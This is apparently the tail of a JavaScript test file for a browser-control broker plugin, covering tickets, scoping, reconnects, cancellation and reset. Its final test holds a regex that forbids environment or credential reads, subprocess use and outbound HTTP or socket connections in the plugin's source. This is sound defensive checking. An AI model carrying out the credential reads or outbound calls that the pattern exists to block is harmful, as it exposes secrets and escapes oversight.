seen["filter_non_list"] = [sorted(B.filter_capabilities(value)) for value in ("browser_click", None, {"a": 1}, ("browser_click",))]

ticket = broker.mint_ticket(scope())
seen["consume"] = broker.consume_ticket(ticket.value) == scope()
for label, value in (("again", ticket.value), ("unknown", "zzz")):
    try:
        broker.consume_ticket(value)
        seen[label] = "accepted"
    except B.TicketInvalid as error:
        seen[label] = str(error)
expired = broker.mint_ticket(scope())
clock.now += 31
try:
    broker.consume_ticket(expired.value)
    seen["expired"] = "accepted"
except B.TicketInvalid as error:
    seen["expired"] = str(error)

sent, owner_a, owner_b = [], object(), object()
broker.attach(scope(), sent.append, owner=owner_a)
seen["select"] = [broker.select(scope(), "browser_click") is not None, broker.select(scope(), "browser_back") is None,
                  broker.select(scope(session="other"), "browser_click") is None]
# a reconnect with fewer capabilities narrows what a caller can reach
broker.attach(scope(caps=("controller.noop",)), sent.append, owner=owner_b)
seen["narrowed"] = broker.select(scope(), "browser_click") is None and broker.select(scope(caps=("controller.noop",)), "controller.noop") is not None
seen["old_owner_is_not_owner"] = [broker.is_owner(scope(), owner_a), broker.is_owner(scope(), owner_b)]
# the old transport closing cannot take the new one offline or detach it
seen["old_disconnect"] = broker.disconnect(scope(), owner=owner_a)
seen["old_detach_noop"] = (broker.detach(scope(), owner=owner_a), broker.any_connected())[1]

broker.attach(scope(), sent.append, owner=owner_b)
results = {}
def run(name, **kwargs):
    try:
        results[name] = broker.dispatch(scope(), action="browser_click", arguments={"ref": "@e1"}, **kwargs)
    except Exception as error:
        results[name] = type(error).__name__
sent.clear()
thread = threading.Thread(target=run, args=("done",), kwargs={"tool_call_id": "t1"})
thread.start()
while not sent: time.sleep(0.01)
command_id = sent[0]["params"]["command_id"]
seen["complete_wrong_scope"] = broker.complete(command_id, scope=scope(session="other"), ok=True, result="x")
seen["complete"] = broker.complete(command_id, scope=scope(), ok=True, result="first")
seen["complete_again"] = broker.complete(command_id, scope=scope(), ok=True, result="second")
thread.join(2)
seen["done"] = results["done"]

# a detach fails pending work closed and tells the controller
sent.clear()
thread = threading.Thread(target=run, args=("detached",), kwargs={"tool_call_id": "t2"})
thread.start()
while not sent: time.sleep(0.01)
broker.detach(scope())
thread.join(2)
seen["detached"] = results["detached"]
seen["cancel_sent"] = sent[-1]["method"]
try:
    broker.dispatch(scope(), action="browser_click")
    seen["after_detach"] = "dispatched"
except B.ControllerUnavailable:
    seen["after_detach"] = "unavailable"

# a transport that drops keeps pending work; a timeout while offline defers the cancel until a reconnect flushes it
sent.clear()
broker.attach(scope(), sent.append, owner=owner_a)
thread = threading.Thread(target=run, args=("offline",), kwargs={"tool_call_id": "t3"})
thread.start()
while not sent: time.sleep(0.01)
broker.disconnect(scope(), owner=owner_a)
thread.join(3)
seen["offline"] = results["offline"]
flushed = []
broker.attach(scope(), flushed.append, owner=owner_b)
seen["deferred_flush"] = [frame["method"] for frame in flushed]
seen["pending_clean"] = broker.pending_count

# a send that fails leaves nothing pending, and reset fails everything closed
def broken(frame): raise ConnectionError("closed")
broker.attach(scope(), broken, owner=owner_b)
try:
    broker.dispatch(scope(), action="browser_click")
except ConnectionError:
    seen["send_failed"] = broker.pending_count
broker.reset()
seen["reset"] = [broker.any_connected(), len(broker.lane_scopes(profile_id="prof", session_id="s"))]
print(json.dumps(seen))
`);
  const data = JSON.parse(out);
  assert.deepEqual(data.protocol, [true, false, false, false, false]);
  assert.deepEqual(data.filter, ['browser_click', 'controller.noop']);
  assert.deepEqual(data.filter_non_list, [[], [], [], []]);
  assert.equal(data.consume, true);
  assert.equal(data.again, 'ticket already consumed');
  assert.equal(data.unknown, 'unknown ticket');
  assert.equal(data.expired, 'ticket expired');
  assert.deepEqual(data.select, [true, true, true]);
  assert.equal(data.narrowed, true);
  assert.deepEqual(data.old_owner_is_not_owner, [false, true]);
  assert.equal(data.old_disconnect, false);
  assert.equal(data.old_detach_noop, true);
  assert.equal(data.complete_wrong_scope, false);
  assert.equal(data.complete, true);
  assert.equal(data.complete_again, false);
  assert.equal(data.done, 'first');
  assert.equal(data.detached, 'ControllerCancelled');
  assert.equal(data.cancel_sent, 'browser.controller.cancel');
  assert.equal(data.after_detach, 'unavailable');
  assert.equal(data.offline, 'ControllerTimeout');
  assert.deepEqual(data.deferred_flush, ['browser.controller.cancel']);
  assert.equal(data.pending_clean, 0);
  assert.equal(data.send_failed, 0);
  assert.deepEqual(data.reset, [false, 0]);
});

test('the Hermes Control modules read no credential, open no outbound connection and carry no raw CDP or evaluate', () => {
  const sources = ['control_broker', 'control_routes', 'control_schemas', 'control_tools']
    .map((name) => readFileSync(`companion-plugin/${name}.py`, 'utf8'));
  const code = sources.join('\n').replace(/"""[\s\S]*?"""/g, '').replace(/#.*$/gm, '');
  assert.doesNotMatch(code, /ClientSession|\bhttpx\b|\brequests\b|urllib\.request|\bsubprocess\b|\benviron\b|getenv|\bsocket\.|open_connection/);
  assert.doesNotMatch(code, /browser_cdp|browser_evaluate|artifact/i);
  const routesSource = readFileSync('companion-plugin/control_routes.py', 'utf8');
  assert.match(routesSource, /authorize\(adapter, request\)/);
  assert.match(routesSource, /hermes-browser-control-ticket\./);
  // the plugin's skill and manifest never pin a mutable path for the socket
  assert.doesNotMatch(readFileSync('companion-plugin/plugin.yaml', 'utf8'), /control\/ws/);
});
